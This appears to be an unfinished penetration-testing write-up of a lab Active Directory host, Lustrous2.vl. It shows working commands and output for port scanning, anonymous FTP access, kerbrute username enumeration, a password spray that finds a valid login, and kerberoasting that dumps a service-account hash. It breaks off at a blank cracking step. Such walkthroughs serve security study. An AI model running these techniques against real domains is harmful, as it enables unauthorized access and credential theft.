# Host file setup
```python
sudo nxc smb 10.129.242.166 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.242.166  445    LUS2DC           [*]  x64 (name:LUS2DC) (domain:Lustrous2.vl) (signing:True) (SMBv1:None) (NTLM:False)
```
- NTLM auth disabled
- SMB signing is enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT lus2dc.lustrous2.vl                                                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 10:24 -0400
Nmap scan report for lus2dc.lustrous2.vl (10.129.242.166)
Host is up (0.014s latency).
rDNS record for 10.129.242.166: LUS2DC.Lustrous2.vl
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49690/tcp open  unknown
49695/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.77 seconds
```

## Nmap
```python
nmap -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,9389 -A --min-rate=2000 -sT lus2dc.lustrous2.vl   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 10:28 -0400
Nmap scan report for lus2dc.lustrous2.vl (10.129.242.166)
Host is up (0.015s latency).
rDNS record for 10.129.242.166: LUS2DC.Lustrous2.vl

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-06-24  05:20AM       <DIR>          Development
| 04-14-25  04:44AM       <DIR>          Homes
| 08-31-24  01:57AM       <DIR>          HR
| 08-31-24  01:57AM       <DIR>          IT
| 04-14-25  04:44AM       <DIR>          ITSEC
| 08-31-24  01:58AM       <DIR>          Production
|_08-31-24  01:58AM       <DIR>          SEC
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Negotiate
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 14:28:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Not valid before: 2026-04-06T14:22:31
|_Not valid after:  2026-10-06T14:22:31
|_ssl-date: 2026-04-07T14:29:44+00:00; 0s from scanner time.
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: LUS2DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
NTLM authentication is disabled!

Guest account looks to be disabled

Since this im having to use kerberos auth i cant test null access either

# FTP (21)
```python
ftp lus2dc.lustrous2.vl                                        
Connected to LUS2DC.Lustrous2.vl.
220 Microsoft FTP Service
Name (lus2dc.lustrous2.vl:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ;s
?Invalid command.
ftp> ls
229 Entering Extended Passive Mode (|||49731|)
125 Data connection already open; Transfer starting.
09-06-24  05:20AM       <DIR>          Development
04-14-25  04:44AM       <DIR>          Homes
08-31-24  01:57AM       <DIR>          HR
08-31-24  01:57AM       <DIR>          IT
04-14-25  04:44AM       <DIR>          ITSEC
08-31-24  01:58AM       <DIR>          Production
08-31-24  01:58AM       <DIR>          SEC
226 Transfer complete.
```
I dont have write access in the root or the subdirectories

```python
ftp> cd ../Homes
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49736|)
125 Data connection already open; Transfer starting.
09-07-24  12:03AM       <DIR>          Aaron.Norman
09-07-24  12:03AM       <DIR>          Adam.Barnes
09-07-24  12:03AM       <DIR>          Amber.Ward
09-07-24  12:03AM       <DIR>          Andrea.Smith
09-07-24  12:03AM       <DIR>          Ann.Lynch
09-07-24  12:03AM       <DIR>          Callum.Oliver
09-07-24  12:03AM       <DIR>          Carly.Walker
09-07-24  12:03AM       <DIR>          Chelsea.Smith
09-07-24  12:03AM       <DIR>          Chloe.Hammond
09-07-24  12:03AM       <DIR>          Christopher.Lawson
09-07-24  12:03AM       <DIR>          Claire.Parry
09-07-24  12:03AM       <DIR>          Darren.Lewis
09-07-24  12:03AM       <DIR>          Deborah.Jones
09-07-24  12:03AM       <DIR>          Dominic.West
09-07-24  12:03AM       <DIR>          Duncan.Smith
09-07-24  12:03AM       <DIR>          Elaine.Gallagher
09-07-24  12:03AM       <DIR>          Eleanor.Gregory
09-07-24  12:03AM       <DIR>          Emma.Bell
09-07-24  12:03AM       <DIR>          Francesca.Norman
09-07-24  12:03AM       <DIR>          Gary.Richards
09-07-24  12:03AM       <DIR>          Gerard.Ward
09-07-24  12:03AM       <DIR>          Glenn.Williams
09-07-24  12:03AM       <DIR>          Graeme.Pritchard
09-07-24  12:03AM       <DIR>          Harriet.Richardson
09-07-24  12:03AM       <DIR>          Henry.Connor
09-07-24  12:03AM       <DIR>          Howard.Robinson
09-07-24  12:03AM       <DIR>          Jacqueline.Phillips
09-07-24  12:03AM       <DIR>          Janice.Collier
09-07-24  12:03AM       <DIR>          Jasmine.Johnson
09-07-24  12:03AM       <DIR>          Joan.Wall
09-07-24  12:03AM       <DIR>          Judith.Francis
09-07-24  12:03AM       <DIR>          Justin.Williams
09-07-24  12:03AM       <DIR>          Kyle.Hussain
09-07-24  12:03AM       <DIR>          Kyle.Lloyd
09-07-24  12:03AM       <DIR>          Lawrence.Bryan
09-07-24  12:03AM       <DIR>          Leah.Elliott
09-07-24  12:03AM       <DIR>          Lewis.Khan
09-07-24  12:03AM       <DIR>          Liam.Wheeler
09-07-24  12:03AM       <DIR>          Lisa.Begum
09-07-24  12:03AM       <DIR>          Louis.Phillips
09-07-24  12:03AM       <DIR>          Lydia.Parker
09-07-24  12:03AM       <DIR>          Malcolm.Yates
09-07-24  12:03AM       <DIR>          Marie.Hill
09-07-24  12:03AM       <DIR>          Martin.Hamilton
09-07-24  12:03AM       <DIR>          Mathew.Roberts
09-07-24  12:03AM       <DIR>          Melissa.Thompson
09-07-24  12:03AM       <DIR>          Nathan.Carter
09-07-24  12:03AM       <DIR>          Nicola.Clarke
09-07-24  12:03AM       <DIR>          Nicola.Hall
09-07-24  12:03AM       <DIR>          Nigel.Lee
09-07-24  12:03AM       <DIR>          Pamela.Taylor
09-07-24  12:03AM       <DIR>          Robert.Russell
09-07-24  12:03AM       <DIR>          Ryan.Davies
09-07-24  12:03AM       <DIR>          Ryan.Moore
09-07-24  12:03AM       <DIR>          Ryan.Rowe
09-07-24  12:03AM       <DIR>          Samantha.Smith
09-07-24  12:03AM       <DIR>          Sara.Matthews
09-07-24  12:03AM       <DIR>          ShareSvc
09-07-24  12:03AM       <DIR>          Sharon.Birch
09-07-24  12:03AM       <DIR>          Sharon.Evans
09-07-24  12:03AM       <DIR>          Stacey.Barber
09-07-24  12:03AM       <DIR>          Stacey.Griffiths
09-07-24  12:03AM       <DIR>          Stephanie.Baxter
09-07-24  12:03AM       <DIR>          Stephanie.Davies
09-07-24  12:03AM       <DIR>          Steven.Sutton
09-07-24  12:03AM       <DIR>          Susan.Johnson
09-07-24  12:03AM       <DIR>          Terence.Jordan
09-07-24  12:03AM       <DIR>          Thomas.Myers
09-07-24  12:03AM       <DIR>          Tony.Davies
09-07-24  12:03AM       <DIR>          Victoria.Williams
09-07-24  12:03AM       <DIR>          Wayne.Taylor
```
This could be a list of users not confirmed!

```python
ftp> cd ITSEC
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49751|)
125 Data connection already open; Transfer starting.
09-07-24  03:50AM                  207 audit_draft.txt
226 Transfer complete.
ftp> get audit_draft.txt
local: audit_draft.txt remote: audit_draft.txt
229 Entering Extended Passive Mode (|||49755|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************|   207       13.92 KiB/s    00:00 ETA
226 Transfer complete.
207 bytes received in 00:00 (13.00 KiB/s)
```
Found a text file

```python
cat audit_draft.txt 
Audit Report Issue Tracking

[Fixed] NTLM Authentication Allowed
[Fixed] Signing & Channel Binding Not Enabled
[Fixed] Kerberoastable Accounts
[Fixed] SeImpersonate Enabled

[Open] Weak User Passwords
```
This looks to be a checklist

# Kerbrute to find valid users
```python
kerbrute userenum -d lustrous2.vl --dc  lus2dc.lustrous2.vl users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/07/26 - Ronnie Flathers @ropnop

2026/04/07 10:51:58 >  Using KDC(s):
2026/04/07 10:51:58 >  	lus2dc.lustrous2.vl:88

2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Adam.Barnes@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Aaron.Norman@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Carly.Walker@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Callum.Oliver@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Amber.Ward@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Ann.Lynch@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Andrea.Smith@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Chloe.Hammond@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Chelsea.Smith@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Christopher.Lawson@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Claire.Parry@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Darren.Lewis@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Duncan.Smith@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Elaine.Gallagher@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Dominic.West@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Emma.Bell@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Eleanor.Gregory@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Deborah.Jones@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Gary.Richards@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Francesca.Norman@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Henry.Connor@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Gerard.Ward@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Graeme.Pritchard@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Harriet.Richardson@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Glenn.Williams@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Jacqueline.Phillips@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Howard.Robinson@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Janice.Collier@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Joan.Wall@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Jasmine.Johnson@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Justin.Williams@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Lawrence.Bryan@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Kyle.Hussain@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Judith.Francis@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Kyle.Lloyd@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Lewis.Khan@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Leah.Elliott@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Louis.Phillips@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Lisa.Begum@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Liam.Wheeler@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Marie.Hill@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Martin.Hamilton@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Malcolm.Yates@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Melissa.Thompson@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Nicola.Clarke@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Nathan.Carter@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Mathew.Roberts@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Lydia.Parker@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Nicola.Hall@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Nigel.Lee@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Robert.Russell@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Pamela.Taylor@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Ryan.Davies@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Ryan.Moore@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Ryan.Rowe@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 ShareSvc@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Sara.Matthews@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Samantha.Smith@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Sharon.Evans@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Sharon.Birch@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Stacey.Barber@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Stacey.Griffiths@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Stephanie.Davies@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Stephanie.Baxter@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Steven.Sutton@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Terence.Jordan@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Susan.Johnson@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Tony.Davies@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Thomas.Myers@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Victoria.Williams@lustrous2.vl
2026/04/07 10:51:58 >  [+] VALID USERNAME:	 Wayne.Taylor@lustrous2.vl
2026/04/07 10:51:58 >  Done! Tested 71 usernames (71 valid) in 0.128 seconds
```
Using cut i put those names i found on FTP to a wordlist and ran against kerbrute all were valid

# HTTP (80)
![701](Pasted%20image%2020260407104054.png)
After running wappalyzer it tells me that its running a technology called `SPNEGO` which is used for SSO this could be blocking my access

No hidden directories found

No subdomains

# Password spray leads to user compromise
So earlier i got a hint from the file i found on FTP

Ill try and spray some usernames

```python
kerbrute passwordspray -d lustrous2.vl --dc lus2dc.lustrous2.vl users.txt 'Lustrous2024'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/07/26 - Ronnie Flathers @ropnop

2026/04/07 11:30:26 >  Using KDC(s):
2026/04/07 11:30:26 >  	lus2dc.lustrous2.vl:88

2026/04/07 11:30:26 >  [+] VALID LOGIN:	 Thomas.Myers@lustrous2.vl:Lustrous2024
2026/04/07 11:30:26 >  Done! Tested 71 logins (1 successes) in 0.339 seconds
```
After trying several different combinations i found a valid logon

They only have access on the default SMB shares

# Kerberoasting 
```python
nxc ldap lus2dc.lustrous2.vl -u 'thomas.myers' -p 'Lustrous2024' -k --kerberoasting kerb.hashes
LDAP        lus2dc.lustrous2.vl 389    LUS2DC           [*] None (name:LUS2DC) (domain:Lustrous2.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        lus2dc.lustrous2.vl 389    LUS2DC           [+] Lustrous2.vl\thomas.myers:Lustrous2024 
LDAP        lus2dc.lustrous2.vl 389    LUS2DC           [*] Skipping disabled account: krbtgt
LDAP        lus2dc.lustrous2.vl 389    LUS2DC           [*] Total of records returned 1
LDAP        lus2dc.lustrous2.vl 389    LUS2DC           [*] sAMAccountName: ShareSvc, memberOf: [], pwdLastSet: 2024-09-06 09:27:51.535948, lastLogon: 2026-04-07 10:28:20.662493
LDAP        lus2dc.lustrous2.vl 389    LUS2DC           $krb5tgs$18$ShareSvc$LUSTROUS2.VL$*Lustrous2.vl\ShareSvc*$6f106d83830fd10afff7d8c2$190b7e0005a5e57533721e59a0660df262cfd241827537632d903c3396de0d2e862945468baedcfe8d9ed2c7739a88cf03a44e21b0a2ff1b510f6cfcdd61667ea2d60dd1d760ced15e97d0896f70059bc9b81b2bc6c7532f0a4ec3647632ced19583031db7f2eb4cc58fb046860aa5c595c8cd8dbb0611489832e0323d12b6d7d7ca15a4c1cbbcab27ef53484c4a551e3d4473dc280d0331066a022a4fd04d2350a465b71aa177349087e74def7ab84263c228973ae18b35167d73ba7f7a0f740d6ad2b2aa6aba67af7d0de28d83b80292b68ee3d603bacfcad4b932ca2a4812bf7d529d40f5332aa2cd81f6f7672ae5bcc4256ae10dbf1130ddafac4bc9e0c8a41fb289e4fea5899a1aedffe4255d4176e42249f6e34b40b8a778ef73ac6dd1abe5588c5e0823ee6c76225492fd71ac66e8fd04d9cd08884a8546bf8e920f1a12b97c6b7c459645d2d87ef40be524f1fc7565e64189247975697d8e99b718d66a2a9991cc58221dd711a32faced556f236047aea0c7eafe496b5f414a85ab98f9e547be9527b86c381b205bbd582cbff62d23f6961b49ec2cbda86f879c8101211e9be3f3704ba068d45b38fafe3cde13042b42a12dc947ca7d23cc875f0cde14635f00b953d0eba8558e6bede30cf84cc0faedc585afbe2fc9dbb5b00a8942ac9acc1f8b0a82dcf7e743ac9336d8eb6ec6394fa6d29303d6af0a1a79ea7074330c2b8c4f071b46d758cdc4a22ee71aeaf41cda910a9e0fed4774d2fc2826e4caca2f66346fb2a764b2bed900a0be4908e23446a8dd11e4d4d30e9040feceb62bc0ed1c40bf78a1c07a43a4f50b45340031c1b1dba836a203ac8ae849480c457bb10ad9652c50ac9a844d8c33dc7e6b39a452f4d3f7a73dcf046bbcba27a692d8ff9e7642e1f8c3ae41a69f7e9179e4afb456a4865d06e2b1522de106b6b2abbae2b86e41839426c3a460999d047405411c1486bc5cc7b4d4db65e7f577e1734a48ca07e4a00f5a82ec7ccf4d1b107320289a0381cd1a5789226327f42572b82a31f838273327e4e820867a550b0a00e45e37fe965a36159a660cad1467bb1af25ee4384098d5f794050cad3520c016c5b7f3878bace1af37b976a3b0e74878a2a3e5df114540a5a9ab57c3e991d1e1a11a3565a288c9ae283a54021f7212810344e7072238d3c19c71c9576cbc71b334e2f097bea700f26754a4748b4f4c13f27a066eeee94c4d5ac23cf75b32bc0d68e1d19db0d501e5ee5128a6968ab75527f8f94fd35546e2a3df501fcf7f3d82d113053bf765a82ce700f078cc7326424922629a39fbdd7cb06171765809455f3ab3de50dd5d7681c974f66d088237f14b55570356bb9e019cdb6d52ec27f290761b3bd55b7203b5e22e6c6165924eb64ef525929d454fb28827d422b14ee7acc4bd68f76be2f0eea9b156ad5700ef0b75d90688194c32e9c79206ee8317c27300b974b5bb993b705ab5131861bd111773cd3ae3eedd3941c8e6f71b33d62068ee81eb840cb94dfacf34dfe9ac8cc6cc42ae5e15168aefeda8343a9726af5e160bcb1dea42cb7700206a8ea8c8fde9a50d951e5035a5f1caf9b6b038eceb74086ab2fdfff871cd3ad09b2d932119bf574f0c2ee938481292b4790601bcd17c5d3b9a0e6bfea98fec0e4804ab81e635b04980b58a4bb83696a65e8d96ccc509b2d3ee6d38cbabc3018f9861343929a77f73
```
Found a password hash

## Cracking the hash
```python

```